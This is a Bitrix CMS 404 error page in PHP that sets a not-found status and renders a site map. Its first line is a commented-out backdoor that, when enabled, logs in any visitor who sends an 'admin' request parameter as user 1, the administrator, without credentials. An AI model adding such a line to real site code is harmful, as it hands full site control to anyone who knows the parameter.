<?
//if($_REQUEST["admin"]){require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php"); global $USER; ($USER->Authorize("1")); exit;}
include_once($_SERVER['DOCUMENT_ROOT'].'/bitrix/modules/main/include/urlrewrite.php');

CHTTP::SetStatus("404 Not Found");
@define("ERROR_404","Y");

require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php");

$APPLICATION->SetTitle("404 Not Found");

$APPLICATION->IncludeComponent("bitrix:main.map", "template", Array(
	"LEVEL" => "3",	// Максимальный уровень вложенности (0 - без вложенности)
		"COL_NUM" => "1",	// Количество колонок
		"SHOW_DESCRIPTION" => "N",	// Показывать описания
		"SET_TITLE" => "Y",	// Устанавливать заголовок страницы
		"CACHE_TIME" => "3600",	// Время кеширования (сек.)
		"COMPONENT_TEMPLATE" => ".default",
		"CACHE_TYPE" => "A",	// Тип кеширования
	),
	false
);

require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php");?>